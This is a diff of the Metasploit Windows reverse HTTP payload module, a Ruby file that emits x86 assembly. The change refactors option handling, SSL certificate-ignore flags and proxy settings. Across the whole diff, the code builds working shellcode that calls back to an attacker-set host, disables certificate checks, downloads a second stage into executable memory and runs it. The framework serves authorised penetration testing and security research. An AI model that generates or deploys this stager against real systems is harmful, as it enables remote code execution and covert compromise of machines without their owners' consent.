@@ -4,10 +4,9 @@ require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
-require 'msf/core/payload/uuid_options'
+require 'msf/core/payload/uuid/options'
 
 module Msf
-
 
 ###
 #
@@ -15,22 +14,20 @@ module Msf
 #
 ###
 
-
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
-  include Msf::Payload::UUIDOptions
+  include Msf::Payload::UUID::Options
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
-    register_advanced_options(
-      [
+    register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
@@ -44,30 +41,26 @@ module Payload::Windows::ReverseHttp
   #
   # Generate the first stage
   #
-  def generate
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_http(
-        ssl:  false,
-        host: datastore['LHOST'],
-        port: datastore['LPORT'],
-        url:  generate_small_uri,
-        retry_count: datastore['StagerRetryCount'])
-    end
-
+  def generate(opts={})
     conf = {
-      ssl:  false,
-      host: datastore['LHOST'],
-      port: datastore['LPORT'],
-      url:  generate_uri,
-      exitfunk: datastore['EXITFUNC'],
-      proxy_host: datastore['PayloadProxyHost'],
-      proxy_port: datastore['PayloadProxyPort'],
-      proxy_user: datastore['PayloadProxyUser'],
-      proxy_pass: datastore['PayloadProxyPass'],
-      proxy_type: datastore['PayloadProxyType'],
+      ssl:         opts[:ssl] || false,
+      host:        datastore['LHOST'],
+      port:        datastore['LPORT'],
+      url:         generate_small_uri,
       retry_count: datastore['StagerRetryCount']
     }
+
+    # Add extra options if we have enough space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:url]         = generate_uri
+      conf[:exitfunk]    = datastore['EXITFUNC']
+      conf[:proxy_host]  = datastore['PayloadProxyHost']
+      conf[:proxy_port]  = datastore['PayloadProxyPort']
+      conf[:proxy_user]  = datastore['PayloadProxyUser']
+      conf[:proxy_pass]  = datastore['PayloadProxyPass']
+      conf[:proxy_type]  = datastore['PayloadProxyType']
+      conf[:retry_count] = datastore['StagerRetryCount']
+    end
 
     generate_reverse_http(conf)
   end
@@ -181,24 +174,32 @@ module Payload::Windows::ReverseHttp
     proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
 
     http_open_flags = 0
+    secure_flags = 0
 
     if opts[:ssl]
-        #;0x80000000 | ; INTERNET_FLAG_RELOAD
-        #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
-        #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
-        #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
-        #;0x00000200 | ; INTERNET_FLAG_NO_UI
-        #;0x00800000 | ; INTERNET_FLAG_SECURE
-        #;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
-        #;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 | # INTERNET_FLAG_NO_UI
+        0x00800000 | # INTERNET_FLAG_SECURE
+        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+      secure_flags = (
+        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
     else
-      #;0x80000000 | ; INTERNET_FLAG_RELOAD
-      #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
-      #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
-      #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
-      #;0x00000200   ; INTERNET_FLAG_NO_UI
-      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 ) # INTERNET_FLAG_NO_UI
     end
 
     asm = %Q^
@@ -220,29 +221,29 @@ module Payload::Windows::ReverseHttp
 
     if proxy_enabled
       asm << %Q^
-        internetopen:
-          push ebx               ; DWORD dwFlags
-          push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
-        call get_proxy_server
-          db "#{proxy_info}", 0x00
-        get_proxy_server:
-                                 ; LPCTSTR lpszProxyName (via call)
-          push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
-          push ebx               ; LPCTSTR lpszAgent (NULL)
-          push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
-          call ebp
-        ^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+                               ; LPCTSTR lpszProxyName (via call)
+        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
     else
       asm << %Q^
-        internetopen:
-          push ebx               ; DWORD dwFlags
-          push ebx               ; LPCTSTR lpszProxyBypass (NULL)
-          push ebx               ; LPCTSTR lpszProxyName (NULL)
-          push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-          push ebx               ; LPCTSTR lpszAgent (NULL)
-          push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
-          call ebp
-        ^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+        push ebx               ; LPCTSTR lpszProxyName (NULL)
+        push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
     end
 
     asm << %Q^
@@ -268,34 +269,34 @@ module Payload::Windows::ReverseHttp
 
     if proxy_enabled && proxy_user
       asm << %Q^
-          ; DWORD dwBufferLength (length of username)
-          push #{proxy_user.length}
-          call set_proxy_username
-        proxy_username:
-          db "#{proxy_user}",0x00
-        set_proxy_username:
-                               ; LPVOID lpBuffer (username from previous call)
-          push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
-          push esi             ; hConnection
-          push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
-          call ebp
-        ^
+        ; DWORD dwBufferLength (length of username)
+        push #{proxy_user.length}
+        call set_proxy_username
+      proxy_username:
+        db "#{proxy_user}",0x00
+      set_proxy_username:
+                             ; LPVOID lpBuffer (username from previous call)
+        push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
     end
 
     if proxy_enabled && proxy_pass
       asm << %Q^
-          ; DWORD dwBufferLength (length of password)
-          push #{proxy_pass.length}
-          call set_proxy_password
-        proxy_password:
-          db "#{proxy_pass}",0x00
-        set_proxy_password:
-                               ; LPVOID lpBuffer (password from previous call)
-          push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
-          push esi             ; hConnection
-          push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
-          call ebp
-        ^
+        ; DWORD dwBufferLength (length of password)
+        push #{proxy_pass.length}
+        call set_proxy_password
+      proxy_password:
+        db "#{proxy_pass}",0x00
+      set_proxy_password:
+                             ; LPVOID lpBuffer (password from previous call)
+        push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
     end
 
     asm << %Q^
@@ -318,26 +319,21 @@ module Payload::Windows::ReverseHttp
         pop edi
 
       send_request:
-      ^
+    ^
 
     if opts[:ssl]
       asm << %Q^
-        ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
-        set_security_options:
-          push 0x00003380
-            ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-            ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-            ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
-            ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
-            ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
-          mov eax, esp
-          push 4                 ; sizeof(dwFlags)
-          push eax               ; &dwFlags
-          push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
-          push esi               ; hHttpRequest
-          push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
-          call ebp
-        ^
+      ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
+      set_security_options:
+        push 0x#{secure_flags.to_s(16)}
+       mov eax, esp
+        push 4                 ; sizeof(dwFlags)
+        push eax               ; &dwFlags
+        push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+        push esi               ; hHttpRequest
+        push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
     end
 
     asm << %Q^
@@ -357,68 +353,69 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
-      ^
+    ^
 
-      if opts[:exitfunk]
-        asm << %Q^
-          failure:
-            call exitfunk
-          ^
-      else
-        asm << %Q^
-          failure:
-            push 0x56A2B5F0        ; hardcoded to exitprocess for size
-            call ebp
-          ^
-      end
-
+    if opts[:exitfunk]
       asm << %Q^
-        allocate_memory:
-          push 0x40              ; PAGE_EXECUTE_READWRITE
-          push 0x1000            ; MEM_COMMIT
-          push 0x00400000        ; Stage allocation (4Mb ought to do us)
-          push ebx               ; NULL as we dont care where the allocation is
-          push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
-          call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+    failure:
+      call exitfunk
+      ^
+    else
+      asm << %Q^
+    failure:
+      push 0x56A2B5F0        ; hardcoded to exitprocess for size
+      call ebp
+      ^
+    end
 
-        download_prep:
-          xchg eax, ebx          ; place the allocated base address in ebx
-          push ebx               ; store a copy of the stage base address on the stack
-          push ebx               ; temporary storage for bytes read count
-          mov edi, esp           ; &bytesRead
+    asm << %Q^
+    allocate_memory:
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      push ebx               ; NULL as we dont care where the allocation is
+      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
-        download_more:
-          push edi               ; &bytesRead
-          push 8192              ; read length
-          push ebx               ; buffer
-          push esi               ; hRequest
-          push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
-          call ebp
+    download_prep:
+      xchg eax, ebx          ; place the allocated base address in ebx
+      push ebx               ; store a copy of the stage base address on the stack
+      push ebx               ; temporary storage for bytes read count
+      mov edi, esp           ; &bytesRead
 
-          test eax,eax           ; download failed? (optional?)
-          jz failure
+    download_more:
+      push edi               ; &bytesRead
+      push 8192              ; read length
+      push ebx               ; buffer
+      push esi               ; hRequest
+      push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
+      call ebp
 
-          mov eax, [edi]
-          add ebx, eax           ; buffer += bytes_received
+      test eax,eax           ; download failed? (optional?)
+      jz failure
 
-          test eax,eax           ; optional?
-          jnz download_more      ; continue until it returns 0
-          pop eax                ; clear the temporary storage
+      mov eax, [edi]
+      add ebx, eax           ; buffer += bytes_received
 
-        execute_stage:
-          ret                    ; dive into the stored stage address
+      test eax,eax           ; optional?
+      jnz download_more      ; continue until it returns 0
+      pop eax                ; clear the temporary storage
 
-        got_server_uri:
-          pop edi
-          call got_server_host
+    execute_stage:
+      ret                    ; dive into the stored stage address
 
-        server_host:
-          db "#{opts[:host]}", 0x00
-        ^
+    got_server_uri:
+      pop edi
+      call got_server_host
 
-      if opts[:exitfunk]
-        asm << asm_exitfunk(opts)
-      end
+    server_host:
+      db "#{opts[:host]}", 0x00
+    ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
     asm
   end
 
@@ -435,7 +432,6 @@ module Payload::Windows::ReverseHttp
   def wfs_delay
     20
   end
-
 
 end
 
